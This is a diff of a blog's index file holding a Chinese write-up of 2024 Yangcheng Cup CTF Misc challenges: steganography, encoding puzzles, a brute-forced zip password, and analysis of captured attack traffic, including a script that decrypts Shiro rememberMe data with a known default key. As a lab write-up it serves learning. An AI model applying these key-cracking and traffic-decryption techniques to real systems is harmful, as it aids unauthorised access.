+<p>安装完成后，把之前那段未知数据的后缀改为.lyra，然后使用lyra解码即可得到一个wav文件</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb7.png"
+                        alt="ycb7"
+                 ></p>
+<p>打开wav，发现语音播报了社会主义核心价值观编码，因此直接找个在线网站识别然后解密即可</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb8.png"
+                        alt="ycb8"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb9.png"
+                        alt="ycb9"
+                 ></p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">DASCTF&#123;W0w!_You_d0_4_g00d_j0b!&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="不一样的数据库-2">不一样的数据库_2</h3>
+<p>题目附件给了一个压缩包，解压密码是弱密码直接爆破就行：753951</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb10.png"
+                        alt="ycb10"
+                 ></p>
+<p>解压后得到一张定位块丢失的二维码，修复定位块</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb11.png"
+                        alt="ycb11"
+                 ></p>
+<p>扫码即可得到一下内容</p>
+<blockquote>
+<p>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</p>
+</blockquote>
+<p>rot13解密一下得到：AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb12.png"
+                        alt="ycb12"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb13.png"
+                        alt="ycb13"
+                 ></p>
+<blockquote>
+<p>Title:passisDASCTF</p>
+<p>UserName:passisDASCTF</p>
+<p>Password:WBArAG6ku6ALmLGGn3iq</p>
+<p>Notes:给你了可以找到flag吗,真相就在其中</p>
+</blockquote>
+<p>翻看历史记录，在里面找到一段AES加密的密文</p>
+<blockquote>
+<p>U2FsdGVkX193h7iNsZs3RsLxH+V1zztkdS+fBy2ZQfzH77Uo4l3hSWplMV+GcLpAGflXlQuPTU5qIkOY7xJN9A==</p>
+</blockquote>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb14.png"
+                        alt="ycb14"
+                 ></p>
+<p>用DASCTF作为密钥<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb15.png"
+                        alt="ycb15"
+                 >解一下这个AES即可得到flag:<code>DASCTF&#123;snsnndjahenanheanjjskk12235&#125;</code></p>
+<h3 id="miaoro">miaoro</h3>
+<p>翻看流量包，发现执行的命令在请求头的 GWHT 字段中</p>
+<p>在流10中发现执行了 echo Th15_11111111s_pP@sssssw000rd!!!&gt;pass.txt 命令</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb16.png"
+                        alt="ycb16"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb17.png"
+                        alt="ycb17"
+                 ></p>
+<p>在流13中发现下载了一个secret.txt</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb18.png"
+                        alt="ycb18"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb19.png"
+                        alt="ycb19"
+                 ></p>
+<p>base64解码响应的数据，发现有一个数据逆序的压缩包<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb20.png"
+                        alt="ycb20"
+                 ></p>
+<p>手动提取出压缩包，用之前得到的密码：Th15_11111111s_pP@sssssw000rd!!!</p>
+<p>解压压缩包可以得到一张 flag2.png 图片，图片明显分块，尝试拼图后发现无果，考虑JPG图片宽高修改</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb22.jpg"
+                        alt="ycb22"
+                 ></p>
+<p>获得一个猫猫字母表，谷歌识图以后找到对照表</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb23.jpg"
+                        alt="ycb23"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923170322209.png"
+                        alt="image-20240923170322209"
+                 ></p>
+<p>得到后半段flag</p>
+<p>在导出HTTP对象中导出几个网页，通过谷歌识图可以发现是<code>sharo-attacker</code>流量，追踪前几个流可以发现<code>sharo-attacker</code>内置字典的第十个密码就是密码：<code>MTIzNDU2Nzg5MGFiY2RlZg==</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补位</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + <span class="built_in">chr</span>(<span class="number">16</span> - <span class="built_in">len</span>(s) % <span class="number">16</span>) * (<span class="number">16</span> - <span class="built_in">len</span>(s) % <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 除去补16字节的多余字符</span></span><br><span class="line">unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_CBC_Decrypt</span>(<span class="params">data, key, iv</span>): <span class="comment"># CBC模式的解密函数，data为密文，key为16字</span></span><br><span class="line">节密钥</span><br><span class="line">	aes = AES.new(key=key, mode=AES.MODE_CBC, iv=iv) <span class="comment"># 创建解密对象</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># decrypt AES解密 B64decode为base64 转码</span></span><br><span class="line">    result = aes.decrypt(data)</span><br><span class="line">    result = unpad(result) <span class="comment"># 除去补16字节的多余字符</span></span><br><span class="line">    <span class="keyword">return</span> result <span class="comment"># 以字符串的形式返回</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force</span>(<span class="params">data, key</span>):</span><br><span class="line">    f = base64.b64decode(data)</span><br><span class="line">    </span><br><span class="line">    keys = <span class="built_in">open</span>(<span class="string">&quot;shiro_keys.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    keyb = base64.b64decode(key)</span><br><span class="line">    iv = f[:<span class="number">16</span>]</span><br><span class="line">    enc = f[<span class="number">16</span>:]</span><br><span class="line">    de = aes_CBC_Decrypt(enc, keyb, iv)</span><br><span class="line">    <span class="keyword">return</span> de</span><br><span class="line"></span><br><span class="line">data =</span><br><span class="line"><span class="string">&quot;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&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;d.data&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(binascii.hexlify(force(data,<span class="string">&quot;MTIzNDU2Nzg5MGFiY2RlZg==&quot;</span>)).decode())</span><br></pre></td></tr></table></figure>
+<p>然后得到 Java 序列化数据，用<code>SerializationDumper</code>得到结构化数据</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb21.jpg"
+                        alt="ycb21"
+                 ></p>
+<p>得到前半段flag，拼接获得<code>DASCTF&#123;B916CFEB-C40F-45D6-A7BC-EB OFDELQDIAA&#125;</code></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -6935,240 +7162,8 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
       </tags>
   </entry>
   <entry>
-    <title>2024羊城杯 Misc方向部分WP</title>
-    <url>//post/ycb2024wp/</url>
-    <content><![CDATA[<h3 id="hiden">hiden</h3>
-<p>题目附件给了下面这两个文件</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb1.png"
-                        alt="ycb1"
-                 ></p>
-<p>txt文件的内容如下</p>
-<blockquote>
-<p>GK4368 ;?:C</p>
-<p>;G8F 34C2WVDJ?E]8&lt;8V[ V6@VX ?7 Di</p>
-<p>​    8&lt;80B?8? l D]6C?BWX</p>
-<p>​    DGJC0JC2 l JC2W8&lt;80B?8?X</p>
-<p>​    8&lt;80B?8? l DGJC0JC2]830@=8C7Wb[ @=8C36BC6 l VJG88JCVX Z 8&lt;80B?8?</p>
-<p>;G8F ;?:C]34C2WQ8C78];?:Q[ Q6@QX ?7 Di</p>
-<p>​    ?886G@ l D]EC84?6?K7WX</p>
-<p>​    ;?:0B?8? l @=8C?66?=W D]6C?BD6?KC7W`X X</p>
-<p>D36 G2BC&lt; G2 6?2ECWJC2W8&lt;80B?8?XXi</p>
-<p>​    ;?:0B?8?,G2BC&lt; Y c. l 8&lt;80B?8?,G2BC&lt;.</p>
-<p>​</p>
-<p>;G8F ;?:C]34C2WQFGBC2];?:Q[ Q;@QX ?7 Di</p>
-<p>​    D]7C84?6?K7W?886G@X</p>
-<p>​    D];6G8CD6?KC7W;?:0B?8?X</p>
-</blockquote>
-<p>根据名称猜测是rot47+rot13，解密可以得到下面的东西，目测python脚本</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb2.png"
-                        alt="ycb2"
-                 ></p>
-<p>然后再来一次rot13解密，即可得到下面这个加密脚本</p>
-<p>对照上面这个加密脚本，写一个脚本提取flag即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> wave.<span class="built_in">open</span>(<span class="string">&quot;hiden.wav&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    wav_data = <span class="built_in">bytearray</span>(f.readframes(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">file_len = <span class="built_in">int</span>.from_bytes(wav_data[<span class="number">0</span>:<span class="number">3</span>*<span class="number">4</span>:<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">extracted_data = <span class="built_in">bytes</span>([wav_data[i*<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">3</span> + file_len)])</span><br><span class="line"><span class="built_in">print</span>(extracted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ok，now you find me,so the flag give you</span></span><br><span class="line"><span class="comment"># DASCTF&#123;12jkl-456m78-90n1234&#125;</span></span><br></pre></td></tr></table></figure>
-<h3 id="checkin">checkin</h3>
-<p>题目附件给了一个压缩包，里面有一个Flag.txt</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb3.png"
-                        alt="ycb3"
-                 ></p>
-<p>压缩包注释里的字符串base58解码后得到:Welcome2GZ</p>
-<p>然后Flag.txt把多余的\x00字符删掉可以得到一个pacpng流量包文件，里面主要是SMB流量</p>
-<p>写了一个python脚本来统计每行\x00字符的数量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict = &#123;</span><br><span class="line">    &quot;11&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;12&quot;: &quot;2&quot;,</span><br><span class="line">    &quot;13&quot;: &quot;3&quot;,</span><br><span class="line">    &quot;14&quot;: &quot;4&quot;,</span><br><span class="line">    &quot;15&quot;: &quot;5&quot;,</span><br><span class="line">    &quot;16&quot;: &quot;6&quot;,</span><br><span class="line">    &quot;17&quot;: &quot;7&quot;,</span><br><span class="line">    &quot;18&quot;: &quot;8&quot;,</span><br><span class="line">    &quot;19&quot;: &quot;9&quot;,</span><br><span class="line">    &quot;20&quot;: &quot;A&quot;,</span><br><span class="line">    &quot;21&quot;: &quot;B&quot;,</span><br><span class="line">    &quot;22&quot;: &quot;C&quot;,</span><br><span class="line">    &quot;23&quot;: &quot;D&quot;,</span><br><span class="line">    &quot;24&quot;: &quot;E&quot;,</span><br><span class="line">    &quot;25&quot;: &quot;F&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def calc():</span><br><span class="line">    with open(&quot;Flag.txt&quot;, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    res = []</span><br><span class="line">    for line in data[:4785]:</span><br><span class="line">        cnt = 0</span><br><span class="line">        for item in line:</span><br><span class="line">            if item == 0:</span><br><span class="line">                cnt += 1</span><br><span class="line">        res.append(cnt)</span><br><span class="line">    for item in res:</span><br><span class="line">        # print(dict[str(item)], end=&quot;&quot;)</span><br><span class="line">        print(item, end=&#x27; &#x27;)</span><br><span class="line">    # print(len(res))</span><br><span class="line">    # print(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    with open(&quot;Flag.txt&quot;, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read().replace(b&#x27;\x00&#x27;, b&#x27; &#x27;)</span><br><span class="line">    with open(&quot;hex.txt&quot;, &quot;wb&quot;) as f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    calc()</span><br><span class="line">    # solve()</span><br></pre></td></tr></table></figure>
-<p>（wbstego隐写，待复现）</p>
-<h3 id="1z-misc">1z_misc</h3>
-<p>附件下载下来后有一个天机不可泄露.txt</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb4.png"
-                        alt="ycb4"
-                 ></p>
-<p>根据网上找到的信息，女可以是坐标(1,1)和坐标(11,24)位置，觜可以是(9,1)和(7,25)位置，根据 是以十二岁 可知十二时辰，每个时辰末尾对应的星宿为坐标开始的字<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb5.png"
-                        alt="ycb5"
-                 ></p>
-<p>获得如下列表</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb6.png"
-                        alt="ycb6"
-                 ></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">心胃心奎奎心奎心胃心心心胃心心胃心奎奎奎奎胃奎心奎奎胃奎心奎心奎奎</span><br></pre></td></tr></table></figure>
-<p>然后只有三个字，猜测是摩斯电码，解得解压密码 E@SI1Y!</p>
-<p>解压后得到一个flag文件和一个hint.jpg</p>
-<p>hint文件中提示了天琴座，天琴座的英文是 lyra</p>
-<p>联想到前不久2024ISCC考察的一道题目，主要用到了这个开源项目 <a class="link"   href="https://github.com/google/lyra" >https://github.com/google/lyra<i class="fas fa-external-link-alt"></i></a></p>
-<p>因此按照Github上的步骤安装一下lyra，这个项目需要使用 bazel 进行安装，所以安装lyra之前需要先安装bazel</p>
-<p>安装完成后，把之前那段未知数据的后缀改为.lyra，然后使用lyra解码即可得到一个wav文件</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb7.png"
-                        alt="ycb7"
-                 ></p>
-<p>打开wav，发现语音播报了社会主义核心价值观编码，因此直接找个在线网站识别然后解密即可</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb8.png"
-                        alt="ycb8"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb9.png"
-                        alt="ycb9"
-                 ></p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">DASCTF&#123;W0w!_You_d0_4_g00d_j0b!&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="不一样的数据库-2">不一样的数据库_2</h3>
-<p>题目附件给了一个压缩包，解压密码是弱密码直接爆破就行：753951</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb10.png"
-                        alt="ycb10"
-                 ></p>
-<p>解压后得到一张定位块丢失的二维码，修复定位块</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb11.png"
-                        alt="ycb11"
-                 ></p>
-<p>扫码即可得到一下内容</p>
-<blockquote>
-<p>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</p>
-</blockquote>
-<p>rot13解密一下得到：AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb12.png"
-                        alt="ycb12"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb13.png"
-                        alt="ycb13"
-                 ></p>
-<blockquote>
-<p>Title:passisDASCTF</p>
-<p>UserName:passisDASCTF</p>
-<p>Password:WBArAG6ku6ALmLGGn3iq</p>
-<p>Notes:给你了可以找到flag吗,真相就在其中</p>
-</blockquote>
-<p>翻看历史记录，在里面找到一段AES加密的密文</p>
-<blockquote>
-<p>U2FsdGVkX193h7iNsZs3RsLxH+V1zztkdS+fBy2ZQfzH77Uo4l3hSWplMV+GcLpAGflXlQuPTU5qIkOY7xJN9A==</p>
-</blockquote>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb14.png"
-                        alt="ycb14"
-                 ></p>
-<p>用DASCTF作为密钥<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb15.png"
-                        alt="ycb15"
-                 >解一下这个AES即可得到flag:<code>DASCTF&#123;snsnndjahenanheanjjskk12235&#125;</code></p>
-<h3 id="miaoro">miaoro</h3>
-<p>翻看流量包，发现执行的命令在请求头的 GWHT 字段中</p>
-<p>在流10中发现执行了 echo Th15_11111111s_pP@sssssw000rd!!!&gt;pass.txt 命令</p>
-<p><img  
-                       lazyload
-                       alt="image"
